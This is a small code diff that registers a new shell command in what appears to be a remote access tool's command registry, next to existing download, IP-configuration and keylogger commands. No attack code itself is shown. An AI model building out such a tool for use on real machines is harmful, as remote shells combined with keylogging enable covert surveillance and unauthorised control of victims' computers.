@@ -1,5 +1,6 @@
 from .help import HelpCommand
 from .download import DownloadCommand
+from .shell import ShellCommand
 from .ipconfig import IPConfigCommand
 from .keylogger import KeyloggerCommand
 
@@ -10,6 +11,7 @@ class CommandRegistry:
 
         self.register(HelpCommand())
         self.register(DownloadCommand())
+        self.register(ShellCommand())
         self.register(IPConfigCommand())
         self.register(KeyloggerCommand())
 
